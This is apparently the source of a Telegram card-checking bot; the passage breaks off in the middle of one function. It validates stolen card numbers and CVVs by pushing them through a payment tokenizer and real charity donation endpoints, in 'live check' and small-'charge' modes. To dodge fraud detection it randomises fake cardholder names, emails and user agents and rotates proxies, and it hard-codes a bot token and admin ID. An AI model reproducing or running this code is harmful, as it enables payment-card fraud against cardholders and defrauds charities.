import telegram
from telegram.ext import Application, CommandHandler, MessageHandler, filters, Defaults, CallbackQueryHandler
import requests
import json
import logging
import asyncio
import io
import re
import time
import os
import shutil
import threading
import random
import psutil # Library for monitoring CPU/RAM
import ssl
import socket
import string
from datetime import datetime
from pytz import timezone
from urllib.parse import urlparse
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, User
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown
from concurrent.futures import ThreadPoolExecutor, as_completed

# Import commands from site_checker file
from site_checker import site_command, sitem_command

# --- NEW: IMPORT GATE CHECKERS FROM THE 'checkers' DIRECTORY ---
from checkers.gate4_checker import check_card_gate4
from checkers.gate6_checker import check_card_gate6
from checkers.gate7_checker import check_card_gate7
from checkers.gate8_checker import check_card_gate8


# --- CONFIGURATION ---
BOT_TOKEN = "8383293948:AAEDVbBV05dXWHNZXod3RRJjmwqc2N4xsjQ"
ADMIN_ID = 5127429005
ADMIN_USERNAME = "@startsuttdow"

# --- STORAGE FILES & DIRECTORIES ---
USER_FILE = "authorized_users.txt"
LIMIT_FILE = "user_limits.json" # Limit for /mass
MULTI_LIMIT_FILE = "multi_limits.json" # Limit for /multi
STATS_FILE = "user_stats.json"
LOG_DIR = "check_logs" # Main directory for logs
BOT_STATUS_FILE = "bot_status.json" # File for bot's on/off status
GATE_FILE = "current_gate.json" # File for the current check gate
GATE_RANGES_FILE = "gate_charge_ranges.json" # File for gate charge ranges
PROXY_FILE = "proxies.json" # File for proxies
# --- NEW ---
GATE1_MODE_FILE = "gate1_mode.json" # File for gate 1 mode
GATE2_MODE_FILE = "gate2_mode.json" # File for gate 2 mode
GATE3_MODE_FILE = "gate3_mode.json" # File for gate 3 mode
GATE8_MODE_FILE = "gate8_mode.json" # File for gate 8 mode
GATE9_MODE_FILE = "gate9_mode.json" # File for gate 9 mode

# --- DEFAULT LIMITS FOR MEMBERS ---
DEFAULT_MEMBER_LIMIT = 100 # For /mass
MEMBER_THREAD_LIMIT = 3 # For /mass
DEFAULT_MULTI_LIMIT = 10 # For /multi

# --- TIMEZONE CONFIGURATION ---
VIETNAM_TZ = timezone('Asia/Ho_Chi_Minh')

# --- GLOBAL VARIABLES ---
# ACTIVE_CHECKS is now a dict to store more info about running tasks
# {user_id: {"full_name": str, "username": str, "start_time": float, "task_type": str}}
ACTIVE_CHECKS = {}
CANCELLATION_EVENTS = {} # {user_id: threading.Event}
STATS_FILE_LOCK = threading.Lock() # Lock to prevent conflicts when multiple users write to the stats file simultaneously

# --- NOTIFICATION MESSAGES ---
MESSAGES = {
    "bot_off": """🔴 **MAINTENANCE NOTICE** 🔴

The bot is temporarily offline for maintenance. Checking commands will be disabled until further notice. Thank you for your patience!""",
    "bot_on": """🟢 **SERVICE RESUMED NOTICE** 🟢

The bot is back online. Thank you for waiting!""",
}

# --- LOGGING CONFIGURATION ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- INITIALIZATION ---
# Create log directory if it doesn't exist
os.makedirs(LOG_DIR, exist_ok=True)
# Create checkers directory if it doesn't exist
os.makedirs("checkers", exist_ok=True)


# --- USER, DATA & GATE MANAGEMENT ---
def load_json_file(filename, default_data={}):
    if not os.path.exists(filename):
        return default_data
    try:
        with open(filename, "r", encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return default_data

def save_json_file(filename, data):
    with open(filename, "w", encoding='utf-8') as f:
        json.dump(data, f, indent=4)

def load_users():
    try:
        with open(USER_FILE, "r") as f:
            return {int(line.strip()) for line in f if line.strip().isdigit()}
    except FileNotFoundError:
        return set()

def save_users(user_set):
    with open(USER_FILE, "w") as f:
        for user_id in user_set:
            f.write(str(user_id) + "\n")

def get_user_limit(user_id):
    limits = load_json_file(LIMIT_FILE)
    return limits.get(str(user_id), DEFAULT_MEMBER_LIMIT)

def get_user_multi_limit(user_id):
    limits = load_json_file(MULTI_LIMIT_FILE)
    return limits.get(str(user_id), DEFAULT_MULTI_LIMIT)

def is_bot_on():
    status = load_json_file(BOT_STATUS_FILE, default_data={'is_on': True})
    return status.get('is_on', True)

def set_bot_status(is_on: bool):
    save_json_file(BOT_STATUS_FILE, {'is_on': is_on})

def get_active_gate():
    gate_data = load_json_file(GATE_FILE, default_data={'gate': '6'}) # Default is gate 6
    return gate_data.get('gate', '6')

def set_active_gate(gate_id):
    save_json_file(GATE_FILE, {'gate': str(gate_id)})

# --- GATE 1 MODE MANAGEMENT (NEW) ---
def get_gate1_mode():
    """Gets the current mode of Gate 1 (charge or live)."""
    mode_data = load_json_file(GATE1_MODE_FILE, default_data={'mode': 'live'}) # Default is live
    return mode_data.get('mode', 'live')

def set_gate1_mode(mode):
    """Sets the mode for Gate 1."""
    if mode in ['live', 'charge']:
        save_json_file(GATE1_MODE_FILE, {'mode': mode})

# --- GATE 2 MODE MANAGEMENT ---
def get_gate2_mode():
    """Gets the current mode of Gate 2 (charge or live)."""
    mode_data = load_json_file(GATE2_MODE_FILE, default_data={'mode': 'charge'}) # Default is charge
    return mode_data.get('mode', 'charge')

def set_gate2_mode(mode):
    """Sets the mode for Gate 2."""
    if mode in ['live', 'charge']:
        save_json_file(GATE2_MODE_FILE, {'mode': mode})

# --- GATE 3 MODE MANAGEMENT (NEW) ---
def get_gate3_mode():
    """Gets the current mode of Gate 3 (charge or live)."""
    mode_data = load_json_file(GATE3_MODE_FILE, default_data={'mode': 'charge'}) # Default is charge
    return mode_data.get('mode', 'charge')

def set_gate3_mode(mode):
    """Sets the mode for Gate 3."""
    if mode in ['live', 'charge']:
        save_json_file(GATE3_MODE_FILE, {'mode': mode})

# --- GATE 8 MODE MANAGEMENT ---
def get_gate8_mode():
    """Gets the current mode of Gate 8 (charge or live)."""
    mode_data = load_json_file(GATE8_MODE_FILE, default_data={'mode': 'live'}) # Default is live check
    return mode_data.get('mode', 'live')

def set_gate8_mode(mode):
    """Sets the mode for Gate 8."""
    if mode in ['live', 'charge']:
        save_json_file(GATE8_MODE_FILE, {'mode': mode})

# --- GATE 9 MODE MANAGEMENT ---
def get_gate9_mode():
    """Gets the current mode of Gate 9 (charge or live)."""
    mode_data = load_json_file(GATE9_MODE_FILE, default_data={'mode': 'live'}) # Default is live check
    return mode_data.get('mode', 'live')

def set_gate9_mode(mode):
    """Sets the mode for Gate 9."""
    if mode in ['live', 'charge']:
        save_json_file(GATE9_MODE_FILE, {'mode': mode})

def _get_charge_value(gate_id, custom_charge_amount=None):
    """Gets the charge value: priority is custom_amount, then range, finally default."""
    if custom_charge_amount is not None:
        return custom_charge_amount

    ranges = load_json_file(GATE_RANGES_FILE)
    gate_range = ranges.get(str(gate_id))

    if gate_range and 'min' in gate_range and 'max' in gate_range:
        try:
            return random.randint(int(gate_range['min']), int(gate_range['max']))
        except (ValueError, TypeError):
            logger.warning(f"Error reading range for gate {gate_id}, using default. Range: {gate_range}")
            return 50 # Default 0.5$ if range is faulty

    return 50 # Default 0.5$ for other gates

def get_formatted_gate_name(gate_id):
    """Gets the formatted gate name with charge info."""
    if str(gate_id) == '7':
        return "Check Live (Gate 7)"

    # --- UPDATED FOR GATE 1 ---
    if str(gate_id) == '1':
        gate1_mode = get_gate1_mode()
        if gate1_mode == 'live':
            return "Check Live (Gate 1)"
        else: # Charge mode
            default_name = "Charge 0.5$ (Gate 1)"
            ranges = load_json_file(GATE_RANGES_FILE)
            gate_range = ranges.get(str(gate_id))

            if gate_range and 'min' in gate_range and 'max' in gate_range:
                try:
                    min_val = int(gate_range['min']) / 100
                    max_val = int(gate_range['max']) / 100
                    if min_val == max_val:
                        return f"Charge {min_val:.2f}$ (Gate 1)"
                    else:
                        return f"Charge {min_val:.2f}$-{max_val:.2f}$ (Gate 1)"
                except (ValueError, TypeError):
                    return default_name
            return default_name

    if str(gate_id) == '2':
        gate2_mode = get_gate2_mode()
        if gate2_mode == 'live':
            return "Check Live (Gate 2)"
        else: # Charge mode
            default_name = "Charge 0.5$ (Gate 2)"
            ranges = load_json_file(GATE_RANGES_FILE)
            gate_range = ranges.get(str(gate_id))

            if gate_range and 'min' in gate_range and 'max' in gate_range:
                try:
                    min_val = int(gate_range['min']) / 100
                    max_val = int(gate_range['max']) / 100
                    if min_val == max_val:
                        return f"Charge {min_val:.2f}$ (Gate 2)"
                    else:
                        return f"Charge {min_val:.2f}$-{max_val:.2f}$ (Gate 2)"
                except (ValueError, TypeError):
                    return default_name
            return default_name

    # --- NEW: GATE 3 ---
    if str(gate_id) == '3':
        gate3_mode = get_gate3_mode()
        if gate3_mode == 'live':
            return "Check Live (Gate 3)"
        else: # Charge mode
            default_name = "Charge 0.5$ (Gate 3)"
            ranges = load_json_file(GATE_RANGES_FILE)
            gate_range = ranges.get(str(gate_id))

            if gate_range and 'min' in gate_range and 'max' in gate_range:
                try:
                    min_val = int(gate_range['min']) / 100
                    max_val = int(gate_range['max']) / 100
                    if min_val == max_val:
                        return f"Charge {min_val:.2f}$ (Gate 3)"
                    else:
                        return f"Charge {min_val:.2f}$-{max_val:.2f}$ (Gate 3)"
                except (ValueError, TypeError):
                    return default_name
            return default_name

    # --- NEW: GATE 4 ---
    if str(gate_id) == '4':
        # Gate 4 is a dedicated charge gate
        default_name = "Charge 0.5$ Year (Gate 4)"
        ranges = load_json_file(GATE_RANGES_FILE)
        gate_range = ranges.get(str(gate_id))

        if gate_range and 'min' in gate_range and 'max' in gate_range:
            try:
                min_val = int(gate_range['min']) / 100
                max_val = int(gate_range['max']) / 100
                if min_val == max_val:
                    return f"Charge {min_val:.2f}$ Year (Gate 4)"
                else:
                    return f"Charge {min_val:.2f}$-{max_val:.2f}$ Year (Gate 4)"
            except (ValueError, TypeError):
                return default_name
        return default_name

    if str(gate_id) == '8':
        gate8_mode = get_gate8_mode()
        if gate8_mode == 'live':
            return "Check Live (Gate 8)"
        else: # Charge mode
            default_name = "Charge 0.5$ (Gate 8)"
            ranges = load_json_file(GATE_RANGES_FILE)
            gate_range = ranges.get(str(gate_id))

            if gate_range and 'min' in gate_range and 'max' in gate_range:
                try:
                    min_val = int(gate_range['min']) / 100
                    max_val = int(gate_range['max']) / 100
                    if min_val == max_val:
                        return f"Charge {min_val:.2f}$ (Gate 8)"
                    else:
                        return f"Charge {min_val:.2f}$-{max_val:.2f}$ (Gate 8)"
                except (ValueError, TypeError):
                    return default_name
            return default_name

    if str(gate_id) == '9':
        gate9_mode = get_gate9_mode()
        if gate9_mode == 'live':
            return "Check Live (Gate 9)"
        else: # Charge mode
            default_name = "Charge 0.5$ (Gate 9)"
            ranges = load_json_file(GATE_RANGES_FILE)
            gate_range = ranges.get(str(gate_id))

            if gate_range and 'min' in gate_range and 'max' in gate_range:
                try:
                    min_val = int(gate_range['min']) / 100
                    max_val = int(gate_range['max']) / 100
                    if min_val == max_val:
                        return f"Charge {min_val:.2f}$ (Gate 9)"
                    else:
                        return f"Charge {min_val:.2f}$-{max_val:.2f}$ (Gate 9)"
                except (ValueError, TypeError):
                    return default_name
            return default_name

    default_names = {
        '6': "Charge 0.5$ (Gate 6)",
    }
    
    ranges = load_json_file(GATE_RANGES_FILE)
    gate_range = ranges.get(str(gate_id))

    if gate_range and 'min' in gate_range and 'max' in gate_range:
        try:
            min_val = int(gate_range['min']) / 100
            max_val = int(gate_range['max']) / 100
            if min_val == max_val:
                return f"Charge {min_val:.2f}$ (Gate {gate_id})"
            else:
                return f"Charge {min_val:.2f}$-{max_val:.2f}$ (Gate {gate_id})"
        except (ValueError, TypeError):
            return default_names.get(gate_id, f"Unknown Gate {gate_id}")
    else:
        return default_names.get(gate_id, f"Unknown Gate {gate_id}")


def update_user_stats(user_id, user_info, counts):
    # Use lock to ensure safety when multiple threads update the file
    with STATS_FILE_LOCK:
        stats = load_json_file(STATS_FILE)
        user_id_str = str(user_id)

        default_user_stat = {
            'username': None, 'full_name': None, 'total_charged': 0, 'total_custom': 0, 'total_live_success': 0,
            'total_decline': 0, 'total_error': 0, 'total_invalid': 0, 'last_check_timestamp': ''
        }
        user_stat_data = stats.get(user_id_str, {})
        if isinstance(user_stat_data, dict):
            default_user_stat.update(user_stat_data)

        stats[user_id_str] = default_user_stat

        stats[user_id_str]['total_charged'] += counts.get('success', 0)
        stats[user_id_str]['total_live_success'] += counts.get('live_success', 0)
        stats[user_id_str]['total_custom'] += counts.get('custom', 0)
        stats[user_id_str]['total_decline'] += counts.get('decline', 0)
        stats[user_id_str]['total_error'] += counts.get('error', 0) + counts.get('gate_dead', 0)
        stats[user_id_str]['total_invalid'] += counts.get('invalid_format', 0)
        stats[user_id_str]['last_check_timestamp'] = datetime.now(VIETNAM_TZ).strftime("%Y-%m-%d %H:%M:%S")
        stats[user_id_str]['username'] = user_info.username
        stats[user_id_str]['full_name'] = user_info.full_name

        save_json_file(STATS_FILE, stats)

# --- PROXY MANAGEMENT FUNCTIONS ---
def load_proxies():
    """Loads the proxy list and status from a JSON file."""
    return load_json_file(PROXY_FILE, default_data={"enabled": False, "proxies": []})

def save_proxies(data):
    """Saves the proxy list and status to a JSON file."""
    save_json_file(PROXY_FILE, data)

def _format_proxy_for_requests(proxy_str):
    """Converts a proxy string to a dict format for the requests library."""
    if not proxy_str:
        return None
    parts = proxy_str.strip().split(':')
    # ip:port
    if len(parts) == 2:
        proxy_url = f"http://{parts[0]}:{parts[1]}"
        return {"http": proxy_url, "https": proxy_url}
    # ip:port:user:pass
    elif len(parts) == 4:
        proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        return {"http": proxy_url, "https": proxy_url}
    else:
        logger.warning(f"Invalid proxy format: {proxy_str}")
        return None

def _test_proxy(proxy_str: str):
    """Tests a proxy by connecting to google.com."""
    proxy_dict = _format_proxy_for_requests(proxy_str)
    if not proxy_dict:
        return False, "Invalid proxy format."
    try:
        response = requests.get("https://www.google.com", proxies=proxy_dict, timeout=7)
        if 200 <= response.status_code < 300:
            return True, f"Success (Status: {response.status_code})"
        else:
            return False, f"Failed (Status: {response.status_code})"
    except requests.exceptions.ProxyError as e:
        return False, f"Proxy Error: {e}"
    except requests.exceptions.RequestException as e:
        return False, f"Connection Error: {e}"
# --- END PROXY FUNCTIONS ---

# --- CORE FUNCTIONS ---

def generate_random_string(length=8):
    """Generates a random string of characters."""
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def random_email():
    """Generates a random email address."""
    prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 15)))
    domain = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
    return f"{prefix}@{domain}.com"

def random_birth_day():
    """Generates a random day for birthday (1-28)."""
    return str(random.randint(1, 28)).zfill(2)

def random_birth_month():
    """Generates a random month for birthday (1-12)."""
    return str(random.randint(1, 12)).zfill(2)

def random_birth_year():
    """Generates a random year for birthday (1970-2005)."""
    return str(random.randint(1970, 2005))


def random_user_agent():
    """Generates a random realistic User-Agent string."""
    chrome_major = random.randint(100, 125)
    chrome_build = random.randint(0, 6500)
    chrome_patch = random.randint(0, 250)
    win_major = random.randint(10, 11)
    win_minor = random.randint(0, 3)
    win_build = random.randint(10000, 22631)
    win_patch = random.randint(0, 500)
    webkit_major = random.randint(537, 605) # Increased range for more variability
    webkit_minor = random.randint(36, 99)
    safari_version = f"{webkit_major}.{webkit_minor}"
    chrome_version = f"{chrome_major}.0.{chrome_build}.{chrome_patch}"
    win_version = f"{win_major}.{win_minor}; Win64; x64"
    return (
        f"Mozilla/5.0 (Windows NT {win_version}) "
        f"AppleWebKit/{safari_version} (KHTML, like Gecko) "
        f"Chrome/{chrome_version} Safari/{safari_version}"
    )

def make_request_with_retry(session, method, url, max_retries=5, cancellation_event=None, **kwargs):
    last_exception = None
    for attempt in range(max_retries):
        if cancellation_event and cancellation_event.is_set():
            return None, "Operation cancelled by user"
        
        try:
            # **kwargs can contain 'proxies' if passed from check_card
            response = session.request(method, url, **kwargs)
            return response, None
        except requests.exceptions.RequestException as e:
            last_exception = e
            wait_time = attempt + 1
            logger.warning(f"Attempt {attempt + 1}/{max_retries} for {url} failed: {e}. Retrying in {wait_time}s...")
            time.sleep(wait_time)
    
    final_error_message = f"Retry: All {max_retries} retry attempts for {url} failed. Last error: {last_exception}"
    logger.error(final_error_message)
    return None, final_error_message

def validate_card_format(cc, mes, ano, cvv):
    if not (cc.isdigit() and 10 <= len(cc) <= 19):
        return False, "Card Number (CC) must be 10-19 digits."
    if not (mes.isdigit() and 1 <= len(mes) <= 2 and 1 <= int(mes) <= 12):
        return False, "Month (MM) must be a number from 1 to 12."
    if not (ano.isdigit() and len(ano) in [2, 4]):
        return False, "Year (YY) must be 2 or 4 digits."
    if not (cvv.isdigit() and 3 <= len(cvv) <= 4):
        return False, "CVV must be 3 or 4 digits."
    return True, ""

def _check_card_gate1(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, custom_charge_amount=None):
    """Logic for Gate 1 - Charge or Live Check Mode"""
    gate1_mode = get_gate1_mode()
    try:
        user_agent = random_user_agent()
        
        # Random personal info
        first_name = generate_random_string(random.randint(12, 20))
        last_name = generate_random_string(random.randint(10, 20))
        cardholder = f"{first_name} {last_name}"
        email = random_email()
        birth_day = random_birth_day()
        birth_month = random_birth_month()
        birth_year = random_birth_year()

        # Step 1: Tokenize card
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://pay.datatrans.com",
            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField",
            "User-Agent": user_agent,
            "X-Requested-With": "XMLHttpRequest"
        }
        tokenize_payload = {
            "mode": "TOKENIZE",
            "formId": "250806042656273071",
            "cardNumber": cc,
            "cvv": cvv,
            "paymentMethod": "ECA",
            "merchantId": "3000022877",
            "browserUserAgent": user_agent,
            "browserJavaEnabled": "false",
            "browserLanguage": "vi-VN",
            "browserColorDepth": "24",
            "browserScreenHeight": "1152",
            "browserScreenWidth": "2048",
            "browserTZ": "-420"
        }

        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Tokenize Error: {error}", bin_info
        if not token_response: return 'error', line, "HTTP Error with no response during Tokenization", bin_info

        if "Card number not allowed in production" in token_response.text:
            return 'decline', line, 'CARD_NOT_ALLOWED_DECLINE', bin_info

        try:
            token_data = token_response.json()
            if "error" in token_data and "message" in token_data.get("error", {}):
                 return 'decline', line, token_data["error"]["message"], bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", "Unknown error at Tokenize"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"HTTP Error {token_response.status_code} during Tokenization", bin_info
            return 'error', line, "Tokenize response was not JSON", bin_info

        # Step 2: Make request based on mode
        payment_headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://donate.raisenow.io",
            "Referer": "https://donate.raisenow.io/",
            "User-Agent": user_agent
        }
        
        base_payload = {
            "account_uuid": "01bd7c99-eefc-42d2-91e4-4a020f6b5cfc",
            "test_mode": False,
            "create_supporter": False,
            "supporter": {
                "locale": "en",
                "first_name": first_name,
                "last_name": last_name,
                "email": email,
                "birth_day": birth_day,
                "birth_month": birth_month,
                "birth_year": birth_year
            },
            "raisenow_parameters": {
                "analytics": {"channel": "paylink", "user_agent": user_agent},
                "solution": {"uuid": "75405349-f0b9-4bed-9d28-df297347f272", "name": "Patenschaft Hundeabteilung", "type": "donate"},
                "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/ynddy?lng=en", "uuid": "self-service", "version": "2.16.0"}
            },
            "payment_information": {
                "brand_code": "eca",
                "cardholder": cardholder,
                "expiry_month": mes.zfill(2),
                "expiry_year": ano,
                "transaction_id": transaction_id
            },
            "profile": "110885c2-a1e8-47b7-a2af-525ad6ab8ca6",
            "return_url": "https://donate.raisenow.io/ynddy?lng=en&rnw-view=payment_result",
        }

        # --- CHARGE MODE ---
        if gate1_mode == 'charge':
            charge_value = _get_charge_value('1', custom_charge_amount)
            payment_url = "https://api.raisenow.io/payments" # Charge endpoint
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "EUR", "value": charge_value}
            # Remove subscription part for charge mode
            payment_payload.pop("subscription", None)

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment", bin_info
            
            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            
            if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
            elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
            elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info
        
        # --- LIVE CHECK MODE (ORIGINAL LOGIC) ---
        else:
            payment_url = "https://api.raisenow.io/payment-sources" # Live check endpoint
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "EUR", "value": 50}
            payment_payload["subscription"] = { "recurring_interval": "6 * *", "timezone": "Asia/Bangkok" }

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Source Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment Source", bin_info

            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            if '"payment_source_status":"pending"' in response_text: return 'live_success', line, response_text, bin_info
            elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info

    except Exception as e:
        logger.error(f"Unknown error in Gate 1 for line '{line}': {e}", exc_info=True)
        return 'error', line, f"Gate 1 System Error: {e}", bin_info

def _check_card_gate2(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, custom_charge_amount=None):
    """Logic for Gate 2 - Charge or Live Check Mode"""
    gate2_mode = get_gate2_mode()
    try:
        user_agent = random_user_agent()
        first_name = generate_random_string(random.randint(12, 20))
        last_name = generate_random_string(random.randint(10, 20))
        cardholder = f"{first_name} {last_name}"

        # Step 1: Tokenize card
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_headers = {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Host": "pay.datatrans.com",
            "Origin": "https://pay.datatrans.com",
            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField",
            "User-Agent": user_agent,
            "X-Requested-With": "XMLHttpRequest"
        }
        tokenize_payload = {
            "mode": "TOKENIZE",
            "formId": "250806055626003241",
            "cardNumber": cc,
            "cvv": cvv,
            "paymentMethod": "ECA",
            "merchantId": "3000022877",
            "browserUserAgent": user_agent,
            "browserJavaEnabled": "false",
            "browserLanguage": "en-US",
            "browserColorDepth": "24",
            "browserScreenHeight": "1152",
            "browserScreenWidth": "2048",
            "browserTZ": "-420"
        }
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Tokenize Error: {error}", bin_info
        if not token_response: return 'error', line, "HTTP Error with no response during Tokenization", bin_info

        if "Card number not allowed in production" in token_response.text:
            return 'decline', line, 'CARD_NOT_ALLOWED_DECLINE', bin_info

        try:
            token_data = token_response.json()
            if "error" in token_data and "message" in token_data.get("error", {}):
                return 'decline', line, token_data["error"]["message"], bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", "Unknown error at Tokenize"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"HTTP Error {token_response.status_code} during Tokenization", bin_info
            return 'error', line, "Tokenize response was not JSON", bin_info

        # Step 2: Request based on mode
        payment_headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://donate.raisenow.io",
            "Referer": "https://donate.raisenow.io/",
            "User-Agent": user_agent
        }
        base_payload = {
            "account_uuid": "14bd66de-7d3a-4d31-98cd-072193050b5f",
            "test_mode": False,
            "create_supporter": False,
            "supporter": {"locale": "de", "first_name": first_name, "last_name": last_name},
            "raisenow_parameters": {
                "analytics": {"channel": "paylink", "user_agent": user_agent},
                "solution": {"uuid": "0a3ee5eb-f169-403a-b4b8-b8641fe2a07d", "name": "Ausbildung Assistenzhund für Christopher", "type": "donate"},
                "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/bchqm?lng=de", "uuid": "self-service", "version": "2.16.0"},
                "integration": {"donation_receipt_requested": "false"}
            },
            "custom_parameters": {"campaign_id": "Ausbildung Assistenzhund für Christopher", "campaign_subid": ""},
            "payment_information": {"brand_code": "eca", "cardholder": cardholder, "expiry_month": mes.zfill(2), "expiry_year": ano, "transaction_id": transaction_id},
            "profile": "30b982d3-d984-4ed7-bd0d-c23197edfd1c",
            "return_url": "https://donate.raisenow.io/bchqm?lng=de&rnw-view=payment_result"
        }

        if gate2_mode == 'charge':
            charge_value = _get_charge_value('2', custom_charge_amount)
            payment_url = "https://api.raisenow.io/payments"
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "EUR", "value": charge_value}

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment", bin_info
            
            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            
            if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
            elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
            elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info
        else: # live mode
            payment_url = "https://api.raisenow.io/payment-sources"
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "EUR", "value": 50}

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Source Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment Source", bin_info

            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            
            if '"payment_source_status":"pending"' in response_text: return 'live_success', line, response_text, bin_info
            elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info

    except Exception as e:
        logger.error(f"Unknown error in Gate 2 for line '{line}': {e}", exc_info=True)
        return 'error', line, f"Gate 2 System Error: {e}", bin_info

def _check_card_gate3(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, custom_charge_amount=None):
    """Logic for Gate 3 - Charge or Live Check Mode"""
    gate3_mode = get_gate3_mode()
    try:
        # Randomization y chang Gate 1
        user_agent = random_user_agent()
        first_name = generate_random_string(random.randint(12, 20))
        last_name = generate_random_string(random.randint(10, 20))
        cardholder = f"{first_name} {last_name}"
        email = random_email()

        # Step 1: Tokenize card
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://pay.datatrans.com",
            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField",
            "User-Agent": user_agent,
            "X-Requested-With": "XMLHttpRequest"
        }
        tokenize_payload = {
            "mode": "TOKENIZE",
            "formId": "250807082606088731",
            "cardNumber": cc,
            "cvv": cvv,
            "paymentMethod": "ECA",
            "merchantId": "3000022877",
            "browserUserAgent": user_agent,
            "browserJavaEnabled": "false",
            "browserLanguage": "vi-VN",
            "browserColorDepth": "24",
            "browserScreenHeight": "844",
            "browserScreenWidth": "390",
            "browserTZ": "-420"
        }
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Tokenize Error: {error}", bin_info
        if not token_response: return 'error', line, "HTTP Error with no response during Tokenization", bin_info

        if "Card number not allowed in production" in token_response.text:
            return 'decline', line, 'CARD_NOT_ALLOWED_DECLINE', bin_info

        try:
            token_data = token_response.json()
            if "error" in token_data and "message" in token_data.get("error", {}):
                return 'decline', line, token_data["error"]["message"], bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", "Unknown error at Tokenize"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"HTTP Error {token_response.status_code} during Tokenization", bin_info
